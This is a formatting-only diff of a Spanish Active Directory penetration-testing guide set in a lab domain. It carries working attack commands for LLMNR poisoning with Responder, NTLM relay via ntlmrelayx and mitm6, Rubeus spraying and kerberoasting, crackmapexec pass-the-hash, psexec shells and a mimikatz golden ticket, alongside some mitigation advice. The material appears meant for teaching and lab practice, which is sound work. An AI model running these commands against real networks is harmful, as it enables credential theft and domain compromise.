@@ -82,19 +82,19 @@
 
 ### Ejecución
 
-1. Ejecutar responder (herramienta de impacket) `responder -I tun0 -rdw -v`.
+- Ejecutar responder (herramienta de impacket) `responder -I tun0 -rdw -v`.
 
 ![Responder](images/llmnr-responder.png)
 
-2. Evento ocurre
+- Evento ocurre.
 
 ![Evento](images/llmnr-event.png)
 
-3. Obtener hashes
+- Obtener hashes.
 
 ![Hashes](images/llmnr-hashes.png)
 
-4. Crackeo de hashes `hashcat -m 5600 hashes.txt rockyou.txt`
+- Crackeo de hashes `hashcat -m 5600 hashes.txt rockyou.txt`.
 
 ![Crackeo](images/llmnr-crack.png)
 
@@ -123,21 +123,21 @@ En vez de buscar crackear los hashes obtenidos con responder, en su lugar se pue
 
 ### Ejecución
 
-1. Modificar `responder.conf`
+- Modificar `responder.conf`.
 
 ![responder.conf](images/responder-conf.png)
 
-2. Ejecutar responder `responder.py -I tun0 -rdw -v`.
+- Ejecutar responder `responder.py -I tun0 -rdw -v`.
 
-3. Configurar relay a utilizar `impacket-ntlmrelayx -tf targets.txt -smb2support`.
+- Configurar relay a utilizar `impacket-ntlmrelayx -tf targets.txt -smb2support`.
 
 ![Impacket ntlmrelay](images/ntlmrelay.png)
 
-4. Evento ocurre
+- Evento ocurre.
 
 ![Evento](images/llmnr-event.png)
 
-5. Win (Pass the hash o Cracking)
+- Win (Pass the hash o Cracking).
 
 ![Win](images/relay-win.png)
 
@@ -166,7 +166,7 @@ La forma de ejecutar se basa en la herramienta [mitm6](https://github.com/dirkja
 
 Es importante señalar que en el ambiente debe estar habilitado `LDAPS`, en la mayoría de los ambientes se encuentra habilitado.
 
-1. Ejecutar mitm6 indicando el dominio `mitm6 -d dsouls.local`
+1. Ejecutar mitm6 indicando el dominio `mitm6 -d dsouls.local`.
 2. Ejecutar ntlmrelayx indicando ip de domain controller, WPAD y loot (en caso de querelo) `impacket-ntlmrelayx -6 -t ldaps://192.168.111.149 -wh fakewpad.dsouls.local -l lootme`.
 3. A la hora de efectuarse, la información recopilada se almacenara en la carpeta indicada para loot.
 
@@ -181,9 +181,9 @@ Es importante señalar que en el ambiente debe estar habilitado `LDAPS`, en la m
 ### Estrategias de mitigación
 
 1. El envenamiento por IPv6 abusa el hecho de que Windows consulta por una dirección IPv6 incluso en ambientes donde sólo está habilitado IPv4. Si internamente no se usa IPv6, la forma más segura de prevenir `mitm6` es bloqueando tráfico DHCPv6 y anuncios entrantes del router en el Firewall de Windows vía Group Policy. Deshabilitar IPv6 completamente podría traer consigo efectos secundarios no deseados. Configurando las siguientes reglas para bloquear en vez de permitir, previene que el ataque funcione.
-    - (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In)
-    - (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
-    - (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)
+    - (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In).
+    - (Inbound) Core Networking - Router Advertisement (ICMPv6-In).
+    - (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out).
 2. Si WPAD no es usado internamente, deshabilitarlo vía Group Policy y deshabilitar el servicio WinHttpAutoProxySvc.
 3. Retransmisión a LDAP y LDAPS sólo puede ser mitigada habilitando LDAP singning y LDAP channel binding.
 4. Considerar etiquetar/mover a los usuarios administrativos al grupo de Protected Users o marcarlos como una Cuenta, es sensible y no puede delegarse, lo que prevendrá la impersonificación de ese usuario vía delegación.
@@ -239,20 +239,21 @@ Tabla de comandos relevantes, verificar documentación y/o [cheatsheet anexada](
 
 ##### Recopilación
 
-
 Recopilación de información con `SharpHound.ps1` disponible en el [repositorio oficial de BloodHound de recolectores](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors).
 
-`Invoke-BloodHound -CollectionMethod All -Domain DSOULS.local -ZipFileName file.zip`
+```powershell
+Invoke-BloodHound -CollectionMethod All -Domain DSOULS.local -ZipFileName file.zip
+```
 
 **Nota: Dentro de los recolectores disponibles específicamente de `SharpHound.ps1` y `SharpHound.exe` se han notado diferencias en como es graficada y recopilada la información, por lo que durante el recopilado de información se sugiere realizar dos recopilados, ejecutando `SharpHound.exe` sin ningún parámetro y `SharpHound.ps1` o `SharpHound.exe` específicando los métodos de recolección (`CollectionMethod`, etc.).**
 
 ##### Carga de información
 
-Seleccionar `Upload Data` ubicado en el menú de la derecha de BloodHound y seleccionar el zip extraído.
+- Seleccionar `Upload Data` ubicado en el menú de la derecha de BloodHound y seleccionar el zip extraído.
 
 ![BloodHound Upload Data](images/bloodhound-upload.png)
 
-Al terminar la carga del zip se podrá visualizar la información recopilada, exponiendo rutas potenciales de escalación y como ejecutarlas.
+- Al terminar la carga del zip se podrá visualizar la información recopilada, exponiendo rutas potenciales de escalación y como ejecutarlas.
 
 ![BloodHound Base de Datos](images/bloodhound-database.png)
 
@@ -313,9 +314,19 @@ Rubeus puede ser usado para hacer fuerza bruta de contraseñas como para hacer p
 
 Este ataque tomará la contraseña basada en Kerberos y realizar un spray en todos los usuarios encontrados proporcionando un ticket `.kirbi`. Este ticket es un TGT que puede ser usado para obtener tickets de servicio del KDC así como usarlo en los ataques así como el ataque pass the ticket.
 
-Antes de ejecutar un spray de contraseñas se necesita añadir el nombre de dominio al archivo de host de windows usando `echo 10.10.116.144 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
+Antes de ejecutar un spray de contraseñas se necesita añadir el nombre de dominio al archivo de host de windows usando:
 
-Ejecutando `Rubeus.exe brute /password:Password1 /noticket` se usará la contraseña proveída y realizará un spray a todos los usuarios que se encuentren y con esto se obtendrá un TGT `.kirbi` para ese usuario.
+```powershell
+echo 10.10.116.144 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+```
+
+Ejecutando:
+
+```powershell
+.\Rubeus.exe brute /password:Password1 /noticket
+```
+
+Se usará la contraseña proveída y realizará un spray a todos los usuarios que se encuentren y con esto se obtendrá un TGT `.kirbi` para ese usuario.
 
 ![Opción spray de Rubeus](images/rubeus-spray.png)
 
@@ -340,8 +351,8 @@ Kerberos in a nutshell:
 Haciendo uso de:
 
 ```powershell
-Rubeus.exe kerberoast # Como Administrator
-Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Password123
+.\Rubeus.exe kerberoast # Como Administrator
+.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Password123
 ```
 
 Se permite el dumpeo de los usuarios aplicables.
@@ -458,9 +469,11 @@ Haciendo uso de `crackmapexec` se pueden validar las credenciales previamente cr
 
 Utilizando:
 
-`crackmapexec {protocolo} {ip/rango} -u {usuario} -d {dominio} -p {contraseña}`
+```bash
+crackmapexec {protocolo} {ip/rango} -u {usuario} -d {dominio} -p {contraseña}
+```
 
-Donde protocolo puede ser `{smb, winrm, ssh, mssql, ldap}`
+Donde protocolo puede ser `{smb, winrm, ssh, mssql, ldap}`.
 
 Ejemplo:
 
@@ -468,7 +481,9 @@ Ejemplo:
 
 O bien, con el hash obtenido se puede loguear a la cuenta igualmente usando `crackmapexec`.
 
-`crackmapexec {protocolo} {ip/rango} -u {usuario} -H {hash} --local-auth`
+```bash
+crackmapexec {protocolo} {ip/rango} -u {usuario} -H {hash} --local-auth
+```
 
 Ejemplo:
 
@@ -484,7 +499,9 @@ Haciendo uso de `impacket-secretsdump` se puede loguear en la cuenta y máquina 
 
 Posteriormente ejecutando `hashcat` se puede buscar crackear la colección de hashes obtenidos indicándolo en las banderas.
 
-`.\hashcat.exe -m {# hashmode} {archivo de hashes} {diccionario}`
+```powershell
+.\hashcat.exe -m {hashmode} {archivo de hashes} {diccionario}
+```
 
 ![Cracking de hashes con hashcat](images/hashcat.png)
 
@@ -492,7 +509,9 @@ Para buscar obtener una shell se puede usar `impacket-psexec`, `impacket-smbexec
 
 Ejemplo:
 
-`impacket-psexec Gwyn:@192.168.111.145 -hashes {valor}`
+```bash
+impacket-psexec Gwyn:@192.168.111.145 -hashes {valor}
+```
 
 TODO: Agregar imagen
 
@@ -595,7 +614,16 @@ Para realizar el procedimiento es necesario obtener el identificador el dominio 
 
 ![SID y Hash NTLM de krbtgt](images/golden-sid.png)
 
-Ejecutar `kerberos::golden /User:<nombre de usuario> /domain:<dominio> /sid:<sid extraido> /krbtgt:<hash NTLM> /id:<rid> /ptt` (Usando `/ptt` para inyectarlo en la sesión actual o sin la bandera para extraerlo a un archivo). Ejemplo `kerberos::golden /User:Administrator /domain:dsouls.local /sid:S-1-5-21-1128842135-684543689-3182004798 /krbtgt:cbb7b576e46b82269910709d9d92ef2d /id:500 /ptt`.
+Ejecutar:
+
+```bash
+kerberos::golden /User:<nombre_de_usuario> /domain:<dominio> /sid:<sid_extraido> /krbtgt:<hash_NTLM> /id:<rid> /ptt
+```
+Usando `/ptt` para inyectarlo en la sesión actual o sin la bandera para extraerlo a un archivo. Ejemplo:
+
+```bash
+kerberos::golden /User:Administrator /domain:dsouls.local /sid:S-1-5-21-1128842135-684543689-3182004798 /krbtgt:cbb7b576e46b82269910709d9d92ef2d /id:500 /ptt
+```
 
 Para crear un silver ticket se sustituiría el hash NTLM del servicio en `/krbtgt:<hash>` el SID del servicio en `/sid:<sid>` y cambiar el id por `/id:1103`.
 
@@ -603,9 +631,9 @@ Para crear un silver ticket se sustituiría el hash NTLM del servicio en `/krbtg
 
 TODO: Verificar la inyección del ticket desde fuera.
 
-Levantar una sesión cmd con el ticket creado: `misc::cmd`.
-Visualizar contenido de un cliente perteneciente al dominio: `dir \\SITH\c$`
-Obtener una shell interactiva en cliente remoto con [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite): `psexec.exe \\SITH cmd.exe`
+- Levantar una sesión cmd con el ticket creado: `misc::cmd`.
+- Visualizar contenido de un cliente perteneciente al dominio: `dir \\SITH\c$`.
+- Obtener una shell interactiva en cliente remoto con [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite): `psexec.exe \\SITH cmd.exe`
 
 ![Sesión con ticket creado y ejecución de psexec](images/psexec-exe.png)
 
@@ -626,7 +654,6 @@ De acuerdo a lo antes mencionado, el timestamp es cifrado con el hash NT de los 
 `misc::skeleton`
 
 TODO: evidencia
-
 
 #### Abusando de ACLs/ACEs
 
